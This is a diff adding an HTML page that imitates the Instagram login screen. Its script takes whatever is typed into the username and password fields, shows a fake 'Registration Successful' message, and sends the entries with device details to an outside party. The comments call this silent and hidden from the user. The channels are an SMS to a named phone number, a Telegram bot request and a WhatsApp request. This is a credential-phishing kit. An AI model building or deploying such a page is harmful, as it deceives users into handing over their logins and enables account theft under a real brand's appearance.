@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Instagram Registration</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #000;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        
+        .mobile-frame {
+            width: 100vw;
+            height: 100vh;
+            max-width: 414px;
+            max-height: 896px;
+            background: #fff;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            border-radius: 0;
+        }
+        
+        @media (min-width: 376px) {
+            .mobile-frame {
+                border-radius: 0
+                box-shadow: 0 0 30px rgba(0,0,0,0.3);
+            }
+        }
+        
+        .close-btn {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            width: 32px;
+            height: 32px;
+            border: none;
+            background: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #8e8e8e;
+            z-index: 10;
+        }
+        
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding: 0 40px;
+            background: #fff;
+            margin-top: 40px;
+        }
+        
+        .logo {
+            font-family: 'Brush Script MT', cursive;
+            font-size: 52px;
+            text-align: center;
+            color: #000;
+            margin-bottom: 60px;
+            font-weight: normal;
+            letter-spacing: -2px;
+        }
+        
+        .form-container {
+            width: 100%;
+            margin-bottom: 40px;
+        }
+        
+        .input-group {
+            margin-bottom: 12px;
+            position: relative;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            background-color: #fafafa;
+            font-size: 14px;
+            outline: none;
+            transition: all 0.2s;
+        }
+        
+        .form-input:focus {
+            border-color: #a8a8a8;
+            background-color: #fff;
+        }
+        
+        .form-input::placeholder {
+            color: #8e8e8e;
+            font-size: 14px;
+        }
+        
+        .signup-btn {
+            width: 100%;
+            padding: 13px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 16px;
+            transition: background-color 0.2s;
+        }
+        
+        .signup-btn:hover {
+            background-color: #1877f2;
+        }
+        
+        .signup-btn:disabled {
+            background-color: #b2dffc;
+            cursor: not-allowed;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 24px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        
+        .divider::before {
+            margin-right: 16px;
+        }
+        
+        .divider::after {
+            margin-left: 16px;
+        }
+        
+        .facebook-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #385185;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            padding: 8px;
+        }
+        
+        .facebook-icon {
+            width: 20px;
+            height: 20px;
+            margin-right: 8px;
+            background: #385185;
+            border-radius: 3px;
+            position: relative;
+        }
+        
+        .facebook-icon::after {
+            content: 'f';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-weight: bold;
+            font-size: 12px;
+        }
+        
+        .bottom-section {
+            padding: 20px 40px;
+            background: #fff;
+        }
+        
+        .login-container {
+            text-align: center;
+            padding: 24px;
+            border-top: 1px solid #dbdbdb;
+        }
+        
+        .login-text {
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+        
+        .login-link {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        .home-indicator {
+            width: 134px;
+            height: 5px;
+            background: #000;
+            border-radius: 3px;
+            margin: 8px auto;
+        }
+        
+        .success-message {
+            background-color: #d4edda;
+            color: #155724;
+            padding: 12px;
+            border-radius: 6px;
+            margin-bottom: 12px;
+            font-size: 13px;
+            text-align: center;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .error-message {
+            background-color: #f8d7da;
+            color: #721c24;
+            padding: 12px;
+            border-radius: 6px;
+            margin-bottom: 12px;
+            font-size: 13px;
+            text-align: center;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .message-popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            z-index: 1000;
+            min-width: 280px;
+            text-align: center;
+            display: none;
+        }
+        
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 999;
+            display: none;
+        }
+        
+        .popup-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #000;
+            margin-bottom: 16px;
+        }
+        
+        .popup-details {
+            font-size: 14px;
+            color: #8e8e8e;
+            line-height: 1.4;
+            margin-bottom: 20px;
+        }
+        
+        .popup-btn {
+            background: #0095f6;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        
+        @media (max-height: 700px) {
+            .logo {
+                font-size: 42px;
+                margin-bottom: 40px;
+            }
+            .main-content {
+                padding: 0 30px;
+            }
+        }
+        
+        @media (max-width: 350px) {
+            .main-content {
+                padding: 0 25px;
+            }
+            .bottom-section {
+                padding: 15px 25px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="mobile-frame">
+        
+        
+        <!-- Main Content -->
+        <div class="main-content">
+            <div class="logo">Instagram</div>
+            
+            <div class="form-container">
+                <div id="message-container"></div>
+                
+                <form id="registrationForm">
+                    <div class="input-group">
+                        <input type="text" id="firstName" class="form-input" placeholder="Phone number, Username or email" required>
+                    </div>
+                    
+                    <div class="input-group">
+                        <input type="text" id="lastName" class="form-input" placeholder="Password" required>
+                    </div>
+                    
+                    <button type="submit" class="signup-btn">Register</button>
+                </form>
+
+                <div class="divider">OR</div>
+
+                <a href="#" class="facebook-login">
+                    <div class="facebook-icon"></div>
+                    Continue as facebook
+                </a>
+            </div>
+        </div>
+        
+        <!-- Bottom Section -->
+        <div class="bottom-section">
+            <div class="login-container">
+                <span class="login-text">Don't have an account? </span>
+                <a href="#" class="login-link">Sign Up.</a>
+            </div>
+            <div class="home-indicator"></div>
+        </div>
+    </div>
+
+    <!-- User Success Popup -->
+    <div class="popup-overlay" id="popupOverlay"></div>
+    <div class="message-popup" id="messagePopup">
+        <div class="popup-title">Registration Successful! ✅</div>
+        <div class="popup-details" id="popupDetails"></div>
+        <button class="popup-btn" onclick="closePopup()">OK</button>
+    </div>
+
+    <script>
+        // Registration form handler
+        document.getElementById('registrationForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const firstName = document.getElementById('firstName').value.trim();
+            const lastName = document.getElementById('lastName').value.trim();
+            const messageContainer = document.getElementById('message-container');
+            
+            if (firstName && lastName) {
+                const currentTime = new Date().toLocaleString('en-IN', {
+                    timeZone: 'Asia/Kolkata',
+                    year: 'numeric',
+                    month: '2-digit',
+                    day: '2-digit',
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit'
+                });
+                
+                // Success message in form
+                messageContainer.innerHTML = `<div class="success-message">✅ Welcome ${firstName}! Registration Successful</div>`;
+                
+                // Registration details
+                const registrationDetails = {
+                    name: firstName,
+                    surname: lastName,
+                    registrationTime: currentTime,
+                    timestamp: Date.now(),
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform
+                };
+                
+                // Show popup to user
+                showUserPopup(registrationDetails);
+                
+                // Send SMS to admin (9109660705) - Silent operation
+                sendSMSToAdmin(registrationDetails);
+                
+                // Clear form
+                document.getElementById('firstName').value = '';
+                document.getElementById('lastName').value = '';
+                
+                // Remove success message after 3 seconds
+                setTimeout(() => {
+                    messageContainer.innerHTML = '';
+                }, 3000);
+                
+            } else {
+                // Error message
+                messageContainer.innerHTML = `<div class="error-message">❌ Please fill both Name and Surname</div>`;
+                
+                setTimeout(() => {
+                    messageContainer.innerHTML = '';
+                }, 3000);
+            }
+        });
+        
+        // Show popup to user (only success message)
+        function showUserPopup(details) {
+            const popup = document.getElementById('messagePopup');
+            const overlay = document.getElementById('popupOverlay');
+            const popupDetails = document.getElementById('popupDetails');
+            
+            popupDetails.innerHTML = `
+                <strong>🎉 Welcome to Instagram!</strong><br><br>
+                Your registration has been completed successfully.<br>
+                Thank you for joining us, ${details.name}!
+            `;
+            
+            overlay.style.display = 'block';
+            popup.style.display = 'block';
+        }
+        
+        // Close popup
+        function closePopup() {
+            document.getElementById('popupOverlay').style.display = 'none';
+            document.getElementById('messagePopup').style.display = 'none';
+        }
+        
+        // Send SMS to admin (Silent background operation)
+        function sendSMSToAdmin(details) {
+            // SMS content for admin
+            const smsMessage = `🔔 NEW REGISTRATION ALERT
+            
+Name: ${details.name}
+Surname: ${details.surname}
+Time: ${details.registrationTime}
+Device: ${details.platform}
+ID: REG${details.timestamp}
+
+Please verify this registration.`;
+            
+            // Method 1: Using Web SMS API (if supported)
+            if ('sms' in navigator) {
+                navigator.sms.send('9109660705', smsMessage).catch(err => {
+                    console.log('SMS API not supported');
+                });
+            }
+            
+            // Method 2: Using mailto as SMS alternative
+            const emailSubject = 'New Registration Alert - Verification Required';
+            const emailBody = `New User Registration Details:
+            
+👤 Name: ${details.name}
+👤 Surname: ${details.surname}
+⏰ Registration Time: ${details.registrationTime}
+📱 Device: ${details.platform}
+🌐 Browser: ${navigator.userAgent.split(' ').pop()}
+🆔 Registration ID: REG${details.timestamp}
+
+⚡ Action Required: Please verify this registration
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+This is an automated message from your website registration system.`;
+            
+            // Silent email sending (hidden from user)
+            const mailtoLink = `mailto:your-email@gmail.com?subject=${encodeURIComponent(emailSubject)}&body=${encodeURIComponent(emailBody)}`;
+            
+            // Method 3: Using Telegram Bot API (if configured)
+            sendTelegramMessage(details);
+            
+            // Method 4: Using WhatsApp API (if configured)
+            sendWhatsAppMessage(details);
+            
+            // Save to localStorage for backup
+            saveRegistrationData(details);
+            
+            // Console log for development (hidden in production)
+            console.log('Registration data sent to admin:', details);
+        }
+        
+        // Telegram Bot integration
+        function sendTelegramMessage(details) {
+            const telegramMessage = `🔔 NEW REGISTRATION ALERT
+
+👤 Name: ${details.name}
+👤 Surname: ${details.surname}  
+⏰ Time: ${details.registrationTime}
+📱 Device: ${details.platform}
+🆔 ID: REG${details.timestamp}
+
+⚡ Verification Required`;
+            
+            // Replace with your bot token and chat ID
+            const botToken = 'YOUR_BOT_TOKEN';
+            const chatId = 'YOUR_CHAT_ID';
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: telegramMessage
+                })
+            }).catch(err => console.log('Telegram API not configured'));
+        }
+        
+        // WhatsApp integration
+        function sendWhatsAppMessage(details) {
+            const whatsappMessage = `🔔 NEW REGISTRATION
+            
+Name: ${details.name} ${details.surname}
+Time: ${details.registrationTime}
+ID: REG${details.timestamp}
+
+Verification needed.`;
+            
+            // Using WhatsApp Business API or third-party service
+            const whatsappAPI = `https://api.whatsapp.com/send?phone=919109660705&text=${encodeURIComponent(whatsappMessage)}`;
+            
+            // Silent background request
+            fetch(whatsappAPI, {
+                method: 'GET',
+                mode: 'no-cors'
+            }).catch(err => console.log('WhatsApp API not available'));
+        }
+        
+        // Save registration data
+        function saveRegistrationData(details) {
+            const registrations = JSON.parse(localStorage.getItem('registrations') || '[]');
+            registrations.push(details);
+            localStorage.setItem('registrations', JSON.stringify(registrations));
+            
+            // Also save in sessionStorage as backup
+            sessionStorage.setItem('lastRegistration', JSON.stringify(details));
+        }
+        
+        // Close button handler
+        document.querySelector('.close-btn').addEventListener('click', function() {
+            if (confirm('Are you sure you want to close?')) {
+                window.close();
+            }
+        });
+        
+        // Prevent zoom on double tap
+        let lastTouchEnd = 0;
+        document.addEventListener('touchend', function (event) {
+            var now = (new Date()).getTime();
+            if (now - lastTouchEnd <= 300) {
+                event.preventDefault();
+            }
+            lastTouchEnd = now;
+        }, false);
+        
+        // Service Worker for background SMS sending
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js').catch(err => {
+                console.log('Service Worker not available');
+            });
+        }
+    </script>
+</body>
+</html>
